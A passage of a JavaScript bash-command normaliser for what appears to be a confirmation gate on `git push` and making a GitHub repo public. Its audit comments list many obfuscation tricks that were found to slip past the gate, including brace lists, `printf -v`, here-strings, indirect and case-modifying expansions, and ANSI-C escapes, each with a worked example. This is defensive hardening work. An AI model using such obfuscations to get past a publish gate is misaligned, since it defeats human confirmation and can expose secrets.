  // degenerate case (`{X..X}` -> `X`) — NOT general range expansion
  // (`{a..z}`, `{1..100}`), which would be materially more engineering
  // effort and a DoS risk for large numeric ranges, well beyond "closes the
  // concrete case." All four reproduced end-to-end via the real
  // gate.mjs/scan.mjs with a real secret and zero confirmation tokens on
  // both the push and go-public paths before being fixed here.
  // 2026-07-12 audit fix (CRITICAL, live bypass, found by a final adversarial
  // combination pass that specifically re-attacked this same step): a
  // declaration-keyword statement (`export`/`declare`/`readonly`/`typeset`)
  // is itself a real command invocation, so its ARGUMENTS undergo bash's
  // normal command-line expansion — including brace expansion — BEFORE the
  // keyword ever sees them. `export v={private,public}` therefore does not
  // assign the literal text `{private,public}`; bash expands it first into
  // TWO arguments, `v=private v=public`, and `export` (like `declare`/
  // `readonly`/`typeset`) applies them left-to-right with the LAST one
  // winning — confirmed live (`bash -x` shows `+ export v=private v=public`,
  // then `+ v=private` then `+ v=public`). The code below used to capture
  // the raw, un-expanded `{private,public}` text as the value and defer
  // expansion to the generic brace-expansion pass further down, which just
  // space-joins the list in place instead of modelling last-write-wins —
  // producing `--visibility=private public` instead of `--visibility=public`,
  // which no longer matches `isGoPublicCommand`'s regex (it requires
  // `public`/`internal` immediately after `=`). Reproduced end-to-end via
  // the real gate.mjs: with only the PRIVATE-publish token recorded (no
  // go-public token), `export v={private,public}; gh repo edit me/app
  // --visibility=$v` was ALLOWED — a live bypass of the private-then-public
  // separation. The bare, no-keyword form (`v={private,public}; ...`) is
  // NOT exploitable and is deliberately left untouched here: a plain
  // assignment word is not itself brace-expanded by bash, so `$v` really
  // does hold the literal, un-expanded text `{private,public}` there, which
  // the existing generic brace-expansion pass below correctly reproduces —
  // confirmed live before scoping this fix to keyword-prefixed assignments
  // only, rather than applying it universally and risking a DIFFERENT
  // divergence from bash's actual (keyword-dependent) behaviour.
  function resolveEmbeddedBraceList(raw) {
    let v = raw.replace(/\{([A-Za-z0-9]+)\.\.\1\}/g, '$1'); // degenerate {X..X} -> X
    const m = v.match(/\{([^{}]*,[^{}]*)\}/);
    if (m) {
      const parts = m[1].split(',');
      v = v.slice(0, m.index) + parts[parts.length - 1] + v.slice(m.index + m[0].length);
    }
    return v;
  }
  // 2026-07-12 Round 8 audit fix (real gap, found by a re-attack pass on
  // the Round 7 array fix, then independently reproduced live before
  // fixing): the bareword alternative below had no exclusion for a leading
  // `(`, so it ALSO matched every `NAME=(elem1 elem2)` array assignment —
  // capturing the bogus scalar value `"(elem1 elem2)"`, parens included.
  // That corrupted value then poisoned two things: (1) the literal parens
  // broke the exact `push`/keyword-boundary matching once substituted back
  // into the command text, and (2) the parameter-expansion-default step
  // read this bogus scalar entry instead of correctly falling through to
  // the array-subscript handling below. Confirmed live on both gates:
  // `arr=(push); git ${arr:-pull} origin main` (real bash: `git push
  // origin main`) and `arr=(public); gh repo edit me/app
  // --visibility=${arr:-private}` (real bash: `--visibility=public`) both
  // returned false/not-go-public. A plain scalar assignment's value can
  // never legitimately start with an unescaped `(` in bash — that syntax
  // is array-assignment only — so excluding it here is safe, not a new
  // divergence.
  // 2026-07-12 Round 10 audit fix (real gap, found by a systematic
  // completeness sweep, then independently reproduced live before fixing):
  // moved earlier so the scalar-assignment loop below can use it too.
  // Unwraps an optional `$((...))` wrapper, and — new this round — also
  // substitutes any BARE variable name (bash arithmetic context allows a
  // variable reference with no `$` prefix) via an optional `lookup`
  // callback before evaluating. Without this, a completely ordinary
  // same-command decrement idiom (`i=${#arr[@]}; i=$((i-1));
  // git "${arr[$i]}"` — the realistic way anyone actually uses an array's
  // length, since the length itself is one past the last valid index) left
  // the second assignment's value as literal, un-evaluated text
  // (`"$((i-1))"`), because the transitive-chain substitution used
  // elsewhere in this file only ever replaces `$i`/`${i}` forms, not a
  // bare `i` inside an arithmetic expression.
  function resolveSimpleArithmetic(expr, lookup) {
    let e = expr.trim();
    const wrap = e.match(/^\$\(\(\s*(.*?)\s*\)\)$/);
    if (wrap) e = wrap[1];
    if (lookup) {
      e = e.replace(
        /\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)|\b([A-Za-z_][A-Za-z0-9_]*)\b/g,
        (m, a, b, c) => {
          const v = lookup(a || b || c);
          return v !== undefined ? v : m;
        },
      );
    }
    const m = e.match(/^(\d+)\s*([+-])\s*(\d+)$/);
    if (m) {
      const a = parseInt(m[1], 10);
      const b = parseInt(m[3], 10);
      return String(m[2] === '+' ? a + b : a - b);
    }
    return /^\d+$/.test(e) ? e : null;
  }
  // The optional `(\+)?` before `=` captures bash's scalar append-assignment
  // operator (`NAME+=value`). Found live 2026-07-19: an unmatched `+=` left
  // every append silently unresolved (frozen at the variable's FIRST plain
  // assignment), defeating both isPushCapable() and isGoPublicCommand()
  // simultaneously — e.g. `p=pu; p+=sh; git $p origin main` real-bash
  // resolves to `git push origin main` but was previously read as `git pu`.
  // This is distinct from the array `+=` case, which remains unsupported
  // (see the module-level comment above).
  const varAssignRe =
    /(?:^|[;\n]|&&)\s*(export|local|readonly|declare|typeset)?\s*([A-Za-z_][A-Za-z0-9_]*)(\+)?=(?:"([^"]*)"|'([^']*)'|((?!\()[^\s;&|]*))/g;
  const known = new Map();
  for (const am of n.matchAll(varAssignRe)) {
    const hadKeyword = Boolean(am[1]);
    const isAppend = Boolean(am[3]);
    const varName = am[2];
    let value = am[4] ?? am[5] ?? am[6] ?? '';
    if (hadKeyword) value = resolveEmbeddedBraceList(value);
    for (const [kName, kValue] of known) {
      const kRe = new RegExp('\\$\\{' + kName + '\\}|\\$' + kName + '\\b', 'g');
      value = value.replace(kRe, () => kValue);
    }
    // 2026-07-12 Round 10 audit fix: if the value is a `$((...))`
    // arithmetic expression, evaluate it now against the known map built
    // SO FAR (matching bash's real left-to-right, same-command chain
    // order) rather than leaving it as literal text — closes the ordinary
    // `i=2; i=$((i-1))` decrement idiom this array-length fix needs to be
    // useful in practice, not just in the direct, unincremented case.
    if (/^\$\(\(.*\)\)$/.test(value.trim())) {
      const resolved = resolveSimpleArithmetic(value, (name) => known.get(name));
      if (resolved !== null) value = resolved;
    }
    if (isAppend) value = (known.get(varName) ?? '') + value;
    known.set(varName, value);
  }
  // 2026-07-12 Round 7 audit fix (CRITICAL x2, found by execution, then
  // independently reproduced by this session before fixing): `printf -v
  // NAME VALUE` is bash's other real way to assign a variable's value —
  // completely different surface syntax from `NAME=value`, so the
  // varAssignRe step above never saw it at all. Confirmed live: `printf -v
  // v push; git $v origin main` left `$v` fully unresolved, and because
  // isPushCapable() returning false makes gate.mjs allow() immediately
  // (before even checking whether a studio project exists), this was a
  // complete, unconditional bypass of BOTH gates simultaneously — worse
  // than any prior finding in this file, which at most defeated the
  // go-public gate alone. The same construct against `--visibility=$v`
  // defeated isGoPublicCommand the same way. Resolved into the same
  // `known` map so it benefits from the same transitive-chain and
  // brace-list handling as an ordinary assignment.
  // 2026-07-12 Round 9 audit fix (real gap, found by a re-attack pass, then
  // independently reproduced live before fixing): the unquoted-value
  // branch used `(\S+)`, which does not stop at a shell metacharacter —
  // `printf -v i 1;` (no space before the semicolon, an entirely normal
  // way to write this) captured `"1;"` as the value instead of `"1"`,
  // which then failed the digit test downstream and left the variable
  // unresolved. Tightened to the same `[^\s;&|]` exclusion set the bareword
  // branch of `varAssignRe` above already uses.
  const printfVRe = /printf\s+-v\s+([A-Za-z_][A-Za-z0-9_]*)\s+(?:"([^"]*)"|'([^']*)'|([^\s;&|]+))/g;
  for (const pm of n.matchAll(printfVRe)) {
    const varName = pm[1];
    let value = pm[2] ?? pm[3] ?? pm[4] ?? '';
    for (const [kName, kValue] of known) {
      const kRe = new RegExp('\\$\\{' + kName + '\\}|\\$' + kName + '\\b', 'g');
      value = value.replace(kRe, () => kValue);
    }
    known.set(varName, value);
  }
  // 2026-07-12 Round 13 audit fix (CRITICAL, found by an adversarial
  // re-attack pass specifically hunting for a genuinely new class of
  // assignment/retrieval syntax, then independently reproduced live before
  // fixing): the `read` builtin reading from a here-string
  // (`read NAME <<< "value"`) is bash's third real way to assign a
  // variable's value — yet another surface syntax the `known` map never
  // recognised. Confirmed live (`read v <<< "push"; echo $v` -> `push`)
  // and via the real isPushCapable(): `read v <<< "push"; git $v origin
  // main` returned false, the same complete, both-gates bypass shape as
  // the printf -v finding above. The go-public analogue
  // (`read v <<< "public"; gh repo edit me/app --visibility=$v`) defeated
  // isGoPublicCommand the same way. Resolved into the same `known` map so
  // it benefits from the same transitive-chain handling.
  const readHereStringRe = /read\s+([A-Za-z_][A-Za-z0-9_]*)\s*<<<\s*(?:"([^"]*)"|'([^']*)'|(\S+))/g;
  for (const rm of n.matchAll(readHereStringRe)) {
    const varName = rm[1];
    let value = (rm[2] ?? rm[3] ?? rm[4] ?? '').trim();
    for (const [kName, kValue] of known) {
      const kRe = new RegExp('\\$\\{' + kName + '\\}|\\$' + kName + '\\b', 'g');
      value = value.replace(kRe, () => kValue);
    }
    known.set(varName, value);
  }
  // 2026-07-12 Round 14 audit fix (CRITICAL, found by a capped final
  // adversarial pass specifically hunting for one more new assignment
  // mechanism, then independently reproduced live before fixing): a real
  // here-DOCUMENT (`read NAME <<DELIM` ... `DELIM`, distinct from the
  // here-STRING `<<<` form already fixed) is a fourth surface syntax for
  // `read` to assign a value — `read`, in real bash, consumes only the
  // FIRST line supplied on stdin. Confirmed live (`read v <<EOF
  // push
  // EOF
  // echo $v` -> `push`) and via the real isPushCapable(): the same
  // command with `git $v` in place of `echo $v` returned false. No
  // command-execution simulation is needed here (unlike process
  // substitution/co-processes, disclosed below) — the value is literal
  // text already sitting in the command string; only its first line is
  // extracted, matching what `read` actually consumes.
  const readHeredocRe =
    /read\s+([A-Za-z_][A-Za-z0-9_]*)\s*<<-?\s*(['"]?)([A-Za-z_][A-Za-z0-9_]*)\2\r?\n([\s\S]*?)\r?\n\3(?=[ \t]*(?:[;\n&|]|$))/g;
  for (const rm of n.matchAll(readHeredocRe)) {
    const varName = rm[1];
    const firstLine = rm[4].split(/\r?\n/)[0];
    let value = decodeAnsiCTokens(firstLine).trim();
    for (const [kName, kValue] of known) {
      const kRe = new RegExp('\\$\\{' + kName + '\\}|\\$' + kName + '\\b', 'g');
      value = value.replace(kRe, () => kValue);
    }
    known.set(varName, value);
  }
  // 2026-07-12 Round 14 audit fix (CRITICAL, found the same way):
  // `mapfile`/`readarray` (bash 4+, aliases of each other) reading a
  // here-string into an array is a structurally different array-
  // population mechanism from the literal `NAME=(...)` compound
  // assignment `knownArrays` is built from — each line of input becomes
  // one array element. Confirmed live (`mapfile -t arr <<< $'pull
  // push'; echo "${arr[1]}"` -> `push`) and via the real isPushCapable():
  // the same command with `git "${arr[1]}"` returned false, because
  // `${arr[1]}` was left as opaque text (the array was never registered
  // in `knownArrays` at all). Only the here-string (`<<<`) form is
  // modelled here, matching this file's established "closes the concrete
  // case" pattern — a `mapfile`/`readarray` fed from an actual file or
  // process substitution would need real I/O this hook deliberately does
  // not perform, and remains an unclosed, disclosed gap the same shape as
  // command substitution.
  const mapfileRe =
    /(?:mapfile|readarray)\s+(?:-t\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*<<<\s*(?:"([^"]*)"|'([^']*)'|(\S+))/g;
  for (const mm of n.matchAll(mapfileRe)) {
    const arrName = mm[1];
    let raw = decodeAnsiCTokens(mm[2] ?? mm[3] ?? mm[4] ?? '');
    for (const [kName, kValue] of known) {
      const kRe = new RegExp('\\$\\{' + kName + '\\}|\\$' + kName + '\\b', 'g');
      raw = raw.replace(kRe, () => kValue);
    }
    const elems = raw
      .split(/\r?\n/)
      .filter((_, i, arr) => !(i === arr.length - 1 && arr[i] === ''));
    knownArrays.set(arrName, elems);
  }
  // 2026-07-12 Round 13 audit fix (CRITICAL, found the same way as above):
  // `set -- word1 word2 ...` resets bash's positional parameters, so
  // `$1`/`$2`/etc. afterward refer to those exact words — a fourth,
  // completely different assignment mechanism (no variable NAME appears
  // in the source text at all; the "name" is a numeric position).
  // Confirmed live (`set -- push; echo "$1"` -> `push`) and via the real
  // isPushCapable(): `set -- push; git "$1" origin main` returned false —
  // the same complete bypass shape once again. Modelled as a numbered
  // entry in the same `known` map (keys `"1"`, `"2"`, ...) so `$1` is
  // resolved by the existing substitution loop below with no separate
  // code path to keep in sync.
  const setPositionalRe = /(?:^|[;\n]|&&)\s*set\s+--\s+([^;\n&|]*)/g;
  for (const sm of n.matchAll(setPositionalRe)) {
    const raw = sm[1].trim();
    const words =
      raw.length === 0 ? [] : raw.split(/\s+/).map((w) => w.replace(/^["']|["']$/g, ''));
    words.forEach((w, i) => known.set(String(i + 1), w));
  }
  // 2026-07-12 Round 13 audit fix (CRITICAL, found the same way): bash's
  // indirect parameter expansion (`${!ref}`) resolves to the VALUE of the
  // variable whose NAME is held by `ref` — a level of indirection none of
  // the direct `$VAR`/`${VAR}` substitution above models. Confirmed live
  // (`name=push; ref=name; echo ${!ref}` -> `push`) and via the real
  // isPushCapable(): `name=push; ref=name; git ${!ref} origin main`
  // returned false — the same bypass shape again. The go-public analogue
  // (`v=public; ref=v; gh repo edit me/app --visibility=${!ref}`) defeated
  // isGoPublicCommand the same way. Resolved by a two-hop lookup: `ref`'s
  // own value (the target NAME) via `known`, then that name's value, also
  // via `known`.
  n = n.replace(/\$\{!([A-Za-z_][A-Za-z0-9_]*)\}/g, (m, refName) => {
    const targetName = known.get(refName);
    if (targetName === undefined || !known.has(targetName)) return m;
    return known.get(targetName);
  });
  // 2026-07-12 Round 13 audit fix (CRITICAL, found the same way): bash's
  // case-modifying parameter expansion (`${VAR,,}` lowercase-all,
  // `${VAR^^}` uppercase-all, `${VAR,}`/`${VAR^}` first-character-only)
  // transforms an already-known value without any new assignment syntax
  // at all — a structurally different gap from every case above (there is
  // no new "assignment" to model; the existing, correctly-resolved value
  // just needs a case transform applied). Confirmed live (`x=PUSH; echo
  // ${x,,}` -> `push`) and via the real isPushCapable(): `x=PUSH; git
  // ${x,,} origin main` returned false.
  n = n.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)(,,|\^\^|,|\^)\}/g, (m, name, op) => {
    if (!known.has(name)) return m;
    const v = known.get(name);
    if (op === ',,') return v.toLowerCase();
    if (op === '^^') return v.toUpperCase();
    if (op === ',') return v.length ? v[0].toLowerCase() + v.slice(1) : v;
    return v.length ? v[0].toUpperCase() + v.slice(1) : v;
  });
  // 2026-07-12 Round 14 audit fix (CRITICAL, found the same way, then
  // independently reproduced live before fixing): bash 4.4+'s `@`
  // transformation operators (`${VAR@L}` lowercase-all, `${VAR@U}`
  // uppercase-all, `${VAR@Q}` shell-quoted form) are a DISTINCT operator
  // family from the `,,`/`^^`/`,`/`^` case-fold operators just above — a
  // separate regex, confirmed live not to already match this syntax at
  // all (`x=PUSH; echo ${x@L}` -> `push`, but `isPushCapable()` returned
  // false for the git-equivalent before this fix).
  n = n.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)@([LUQ])\}/g, (m, name, op) => {
    if (!known.has(name)) return m;
    const v = known.get(name);
    if (op === 'L') return v.toLowerCase();
    if (op === 'U') return v.toUpperCase();
    return `'${v}'`; // @Q: bash's shell-quoted form
  });
  // 2026-07-12 Round 14 audit fix (CRITICAL, found the same way): bash's
  // substring parameter expansion (`${VAR:offset:length}`, or
  // `${VAR:offset}` for "to the end") extracts a slice of an
  // already-resolved value with no new assignment syntax at all — the
  // only colon-form previously recognised was the `:-`/`:=` default-value
  // pair; a numeric offset/length is a different sub-syntax entirely.
  // Confirmed live (`x=xxpushxx; echo ${x:2:4}` -> `push`) and via the
  // real isPushCapable(): the git-equivalent returned false before this
  // fix. No ambiguity with the default-value regex above: a `-`/`=` and a
  // digit can never both be the first character after the colon.
  n = n.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*):(\d+)(?::(\d+))?\}/g, (m, name, off, len) => {
    if (!known.has(name)) return m;
    const v = known.get(name);
    const offset = parseInt(off, 10);
    return len !== undefined ? v.substr(offset, parseInt(len, 10)) : v.slice(offset);
  });
  // 2026-07-21 Round 7 audit fix (CRITICAL, reproduced end-to-end against the real
  // gates before fixing): bash pattern-substitution `${v//pat/repl}` (replace all),
  // `${v/pat/repl}` (replace first), and pattern-removal `${v#pat}`/`${v##pat}`
  // (strip prefix) / `${v%pat}`/`${v%%pat}` (strip suffix) are the same class of
  // same-command-resolvable scalar transform as the case-mod/@/substring passes
  // above — no execution or persistent state needed — yet were unmodelled, so
  // `x=puXsh; git ${x//X/} origin main` (and the go-public `${v//X/}` analogue)
  // resolved to a real push/visibility-change in bash while both gates saw no
  // literal `push`/`public` and failed OPEN. Resolved here for the same `known`
  // scalar map; the pattern is treated as a LITERAL string (a bar-raiser — bash
  // glob metacharacters in the pattern are not interpreted, consistent with this
  // matcher's stated "raises the bar, not a determined-adversary sandbox" scope).
  n = n.replace(
    /\$\{([A-Za-z_][A-Za-z0-9_]*)(\/\/?)([^/}]*)(?:\/([^}]*))?\}/g,
    (m, name, op, pat, repl) => {
      if (!known.has(name) || pat === '') return m;
      const v = known.get(name);
      const r = repl === undefined ? '' : repl;
      if (op === '//') return v.split(pat).join(r); // replace all
      const i = v.indexOf(pat); // replace first
      return i === -1 ? v : v.slice(0, i) + r + v.slice(i + pat.length);
    },
  );
  n = n.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)(#{1,2}|%{1,2})([^}]*)\}/g, (m, name, op, pat) => {
    if (!known.has(name) || pat === '') return m;
    const v = known.get(name);
    // literal prefix (# / ##) or suffix (% / %%) removal — for a literal
    // (non-glob) pattern, shortest and longest match are identical.
    if (op[0] === '#') return v.startsWith(pat) ? v.slice(pat.length) : v;
    return v.endsWith(pat) ? v.slice(0, v.length - pat.length) : v;
  });
  // 2026-07-12 Round 8 audit fix (real gap, found by a re-attack pass,
  // then independently reproduced live before fixing): the subscript
  // resolver only ever accepted a LITERAL digit (`${arr[1]}`) — a
  // variable index (`i=1; ${arr[$i]}`) or a simple arithmetic index
  // (`${arr[$((0+1))]}`) both resolve to the same real element in bash
  // (confirmed live) but were left completely unmodelled, so
  // `arr=(pull push); i=1; git "${arr[$i]}" origin main` was allowed.
  // Deliberately narrow, matching this file's established pattern: only a
  // name already resolved by the scalar `known` map, or a two-operand
  // `N+M`/`N-M` arithmetic expression, is handled — no general shell
  // arithmetic evaluator (and deliberately no `eval`/`Function`
  // construction of any kind, even though the digit-only input this
  // parses would be safe, to keep this file free of anything resembling
  // dynamic code execution on principle).
  // 2026-07-12 Round 9 audit fix (real gap, found by a re-attack pass, then
  // independently reproduced live before fixing): bash array subscripts
  // are evaluated in ARITHMETIC context, where a bare variable name (no
  // leading `$`) is valid and means that variable's value — confirmed live
  // (`arr=(pull push); i=1; echo "${arr[i]}"` -> `push`). The `$`/`${...}`
  // requirement here missed this bare form entirely, so `${arr[i]}` (as
  // opposed to `${arr[$i]}`, which the `$`-prefixed branch already
  // handled) was left unresolved.
  // 2026-07-12 Round 10 audit fix (real gap, found by a systematic
  // completeness sweep, then independently reproduced live before fixing):
  // a NEGATIVE literal index (`${arr[-1]}`, bash's "from the end" syntax)
  // was rejected by the digit-only literal check, so a real last-element
  // reference was left unresolved. Also: array-subscript resolution ran
  // BEFORE the final `$IFS`/`${IFS}` normalisation pass further below, so
  // an IFS-obfuscated subscript (`${arr[$i${IFS}]}`, where real bash's
  // word-splitting collapses this to the plain index `$i`) never matched
  // any of the patterns here and was permanently left unresolved (the
  // array-resolution loop only runs once, earlier than the pass that would
  // otherwise have cleaned this up). Fixed by normalising `$IFS`/`${IFS}`
  // to a space inside the subscript text itself before every other check.
  function resolveSubscript(sub) {
    const s = sub
      .trim()
      .replace(/\$\{IFS\}|\$IFS\b/g, ' ')
      .trim();
    if (/^-?\d+$/.test(s)) return s;
    let m = s.match(/^\$\(\(\s*(.*?)\s*\)\)$/);
    if (m) return resolveSimpleArithmetic(m[1]);
    m = s.match(/^\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?$/) || s.match(/^([A-Za-z_][A-Za-z0-9_]*)$/);
    if (m && known.has(m[1])) return resolveSimpleArithmetic(known.get(m[1]));
    return null;
  }
  for (const [arrName, elems] of knownArrays) {
    const idxRe = new RegExp('\\$\\{' + arrName + '\\[([^\\]]+)\\]\\}', 'g');
    n = n.replace(idxRe, (m, sub) => {
      const idxStr = resolveSubscript(sub);
      if (idxStr === null) return m;
      let idx = parseInt(idxStr, 10);
      if (idx < 0) idx = elems.length + idx;
      const el = elems[idx];
      return el !== undefined ? el : m;
    });
    const allRe = new RegExp('\\$\\{' + arrName + '\\[[@*]\\]\\}', 'g');
    n = n.replace(allRe, () => elems.join(' '));
    const bareRe = new RegExp('\\$\\{' + arrName + '\\}|\\$' + arrName + '\\b(?!\\[)', 'g');
    n = n.replace(bareRe, () => (elems[0] !== undefined ? elems[0] : ''));
  }
  // 2026-07-12 Round 7 audit fix (CRITICAL, found by execution): bash's
  // parameter-expansion default-value syntax (`${VAR:-default}`,
  // `${VAR-default}`, `${VAR:=default}`, `${VAR=default}`) supplies a
  // literal value with NO assignment anywhere in the string — there is
  // nothing for the varAssignRe step above to even attempt to resolve,
  // since the code only ever looked for `VAR=value` text, not this
  // structurally different in-place default. Confirmed live (`unset v;
  // echo "${v:-public}"` -> `public`) and via the real isGoPublicCommand
  // logic: `gh repo edit me/app --visibility=${v:-public}` with `v` never
  // assigned anywhere returned false. When the name IS one this pass
  // already resolved (assigned earlier in the same command), that value is
  // used instead of the default, matching bash's real "only fall back when
  // unset/empty" semantics for the common case; a name that's genuinely
  // unset resolves to the literal default text, which is the safe (fails
  // toward catching, never toward missing) direction for a security match.
  // 2026-07-12 Round 8 audit fix (real gap, found by a re-attack pass,
  // then independently reproduced live before fixing): when `name` is a
  // known ARRAY rather than a scalar, bash still resolves an unsubscripted
  // reference like `${arr:-default}` to element 0 whenever that element
  // is set/non-empty — the default only applies when the whole thing is
  // genuinely unset/empty. The array case was missed entirely here (only
  // the scalar `known` map was checked), so `arr=(push);
  // git ${arr:-pull} origin main` resolved to the DEFAULT "pull" instead
  // of the real element-0 value "push" — the wrong direction for a
  // security match (under-detecting a real push), confirmed live before
  // fixing.
  // 2026-07-21 Round 7 audit fix (proactively closing the rest of the
  // same-command-resolvable parameter-expansion family alongside the CRITICAL
  // pattern-substitution fix above, so the class converges in one sweep rather
  // than one operator per round). `${VAR:+alt}`/`${VAR+alt}` expands to `alt` when
  // VAR is set (`:` also requires non-empty). Fail closed for the matcher: use
  // `alt` unless we positively know VAR is empty (so `${x:+push}` is caught).
  n = n.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)(:?)\+([^{}]*)\}/g, (_m, name, colon, alt) => {
    if (colon === ':' && known.has(name) && known.get(name) === '') return '';
    return alt;
  });
  // `${VAR:?msg}`/`${VAR?msg}` expands to VAR's value when set (msg only prints to
  // stderr on unset); the payload is the VALUE, not msg. Resolve to the known
  // value, else leave literal (we don't have the value to over-detect).
  n = n.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*):?\?[^{}]*\}/g, (m, name) =>
    known.has(name) ? known.get(name) : m,
  );
  n = n.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*):?[-=]([^{}]*)\}/g, (_m, name, def) => {
    if (knownArrays.has(name)) {
      const el = knownArrays.get(name)[0];
      return el !== undefined && el !== '' ? el : def;
    }
    return known.has(name) ? known.get(name) : def;
  });
  for (const [varName, value] of known) {
    const varRe = new RegExp('\\$\\{' + varName + '\\}|\\$' + varName + '\\b', 'g');
    n = n.replace(varRe, () => value);
  }
  // 2026-07-26 further-pass audit note: a background review agent found that
  // this pair of replaces runs blind to quoting, so ordinary quoted prose
  // containing a brace-comma pattern (e.g. `echo "use {git,push} carefully"`)
  // gets "expanded" and can trip the downstream keyword match. A fix scoping
  // this to bare (unquoted) text ONLY was attempted and reverted: it broke an
  // existing, deliberately-crafted test one test below
  // (`{g""it,pu""sh} origin main`) — real bash actually DOES treat the comma
  // there as a live separator, because bash's brace expansion runs before
  // quote removal and only cares whether a character is quoted at the exact
  // tokenization point, not whether the overall `{...}` spans a quoted
  // sub-segment. A quote-scoped version of this specific transform would
  // need to track that same subtlety to stay correct, and getting it wrong
  // in the unsafe direction (missing a real push) is worse than leaving this
  // as a narrow, safe-direction-only false positive. Left as a disclosed
  // residual limitation — see AUDIT-2026-07.md.
  n = n.replace(/\{([A-Za-z0-9]+)\.\.\1\}/g, '$1'); // degenerate {X..X} range -> X
  n = n.replace(/\{([^{}]*,[^{}]*)\}/g, (_m, list) => list.split(',').join(' '));
  // 2026-07-11 Round 7 security fix: ANSI-C quoting (`$'public'`) resolves
  // to the literal text `public` in bash, but nothing here recognised the
  // `$'...'` form at all, so `gh repo edit me/app --visibility $'public'`
  // (and the `=$'public'` / mid-word `--pub$'lic'` variants) sailed through
  // both isPushCapable's own gh-detection and isGoPublicCommand with only
  // the private-publish token recorded — reproduced live via bash itself
  // (`x=$'public'; echo "$x"` -> `public`) before fixing. Stripped to its
  // raw inner text before the generic backslash-unescape pass and IFS/
  // quote-splice steps that follow (2026-07-12 Round 5 comment fix: this
  // said "FIRST, before any other step" — no longer accurate now that the
  // Round 4 variable-substitution step and the brace-expansion step both
  // run earlier; the ordering THIS comment actually cares about — before
  // the generic backslash pass, so an escaped quote inside the ANSI-C
  // string isn't resolved too early — still holds), using an escape-aware
  // match (`\\.` consumes an escaped char, including an escaped quote,
  // without treating it as the closing quote) so the wrapper's true end is
  // found correctly even if the content contains `\'`. This runs before the
  // generic backslash-unescape pass below on purpose: that pass would
  // otherwise resolve an escaped quote inside the ANSI-C string too early
  // and corrupt where this wrapper actually ends.
  // 2026-07-11 Round 8 security fix: the wrapper-strip above passed the
  // ANSI-C content through UNCHANGED, but bash also decodes `\xHH` (hex)
  // and `\NNN` (octal) escapes inside `$'...'` — so `$'pub\x6cic'` and
  // `$'pub\154ic'` both resolve to the literal text `public` in bash (the
  // hex/octal escapes spell the letter `l`), and `$'\x67\x68'` resolves to
  // `gh`, letter-by-letter spelling the binary name itself. The old code
  // left `\x6c`/`\154` as literal backslash-digit text, which the generic
  // backslash-unescape pass below then mangled into garbage (`x6c`, `154`)
  // instead of the real decoded character — so neither the keyword nor the
  // binary-name regexes ever saw `public`/`gh`, an unconditional bypass.
  // Decoded BEFORE stripping the wrapper (any other backslash escape inside
  // the string, e.g. `\'`, is left for the generic pass right after).
  // 2026-07-12 Round 9 audit fix: now calls the shared decodeAnsiCTokens()
  // helper (defined above, alongside the array-element parsing) instead of
  // its own inline copy of the same logic, so the two decode paths cannot
  // drift apart from each other again the way they just did.
  n = decodeAnsiCTokens(n); // $'public' -> public, $'pub\x6cic' -> public, $'\x67\x68' -> gh
  n = n.replace(/\\\r?\n/g, ''); // backslash-newline line continuation
  // Un-escape a backslash before ANY other (non-newline) character: in bash,
  // outside quotes, `\X` is just a literal `X`, whatever X is. 2026-07-11
  // Round 6 security fix — the earlier `[A-Za-z0-9]`-only version left
  // escaped PUNCTUATION intact, so `gh repo edit me/app -\-public`,
  // `\-\-public`, and `--visibility\=public` kept their backslashes and the
  // go-public regexes missed them, while bash ran a real `--public` /
  // `--visibility=public` — an obfuscated going-public bypass that passed
  // with only the private-publish token. Now `\X` -> `X` for any X.
  //
  // 2026-07-26 Wave 2 CI fix (Windows-only failure, reproduced: `not ok 13`,
  // `'deny' !== 'allow'`). This comment already said "outside quotes", but
  // the implementation below was a blanket `replace` blind to quoting, same
  // bug class Round 5 fixed for the compound-operator check. Real bash only
  // unescapes `\X` -> `X` unconditionally OUTSIDE quotes; inside double
  // quotes it unescapes only `\$`, `` \` ``, `\"` and `\\` (any other `\X`
  // stays literal backslash-then-X — bash does not touch it), and inside
  // single quotes nothing is ever unescaped. The blanket version destroyed
  // every backslash in any quoted argument, including a native Windows path
  // like `"D:\a\...\confirm-publish.mjs"` — which is exactly what
  // hooks.test.mjs feeds the confirm-script exemption, so `path.basename()`
  // downstream in isConfirmScriptOnly() no longer saw `confirm-publish.mjs`
  // and the exemption silently stopped applying on windows-latest CI.
  // This does not reopen Round 6: `gh repo edit me/app "-\-public"` is not a
  // real bash evasion either way, because double quotes never unescape
  // `\-`; the unquoted case Round 6 actually cares about is untouched here.
  n = unescapeBackslashesRespectingQuotes(n); // p\ush -> push, -\-public -> --public; quoted backslashes left alone
  n = n.replace(/\$\{IFS\}|\$IFS\b/g, ' '); // git${IFS}push -> git push
  let prev;
  do {
    prev = n;
    // strip a quote char only when word/quote characters sit on BOTH
    // immediate sides (the mid-word-splice signature), one layer per pass;
    // loop to a fixed point so chained splices like p"u"s"h" fully
    // resolve. A quote at a real token boundary (next to whitespace, the
    // start, or the end of the string) is left alone.
    n = n
      .replace(/([A-Za-z0-9_"'-])(["'])(?=[A-Za-z0-9_"'-])/g, '$1')
      .replace(/(?<=[A-Za-z0-9_"'-])(["'])([A-Za-z0-9_-])/g, '$2');
  } while (n !== prev);
  return n;
}
// 2026-07-26 Wave 2 CI fix — see the call site in normalizeForPushCheck for
// the full story. Quote-aware backslash unescaping: outside any quotes,
// `\X` unescapes to `X` for any X (the Round 6 obfuscation case); inside
// double quotes, only bash's own four recognised escapes (`\$`, `` \` ``,
// `\"`, `\\`) unescape, everything else stays literal backslash-then-char;
// inside single quotes nothing is ever unescaped (bash forbids an embedded
// literal `'` there at all, so meeting one always closes the quote).
function unescapeBackslashesRespectingQuotes(s) {
  let out = '';
  let inSingle = false;
  let inDouble = false;
  for (let i = 0; i < s.length; i++) {
    const ch = s[i];
    if (inSingle) {
      out += ch;
      if (ch === "'") inSingle = false;
      continue;
    }
    if (inDouble) {
      if (ch === '\\' && i + 1 < s.length && '$`"\\'.includes(s[i + 1])) {
        out += s[i + 1];
        i++;
        continue;
      }
      out += ch;
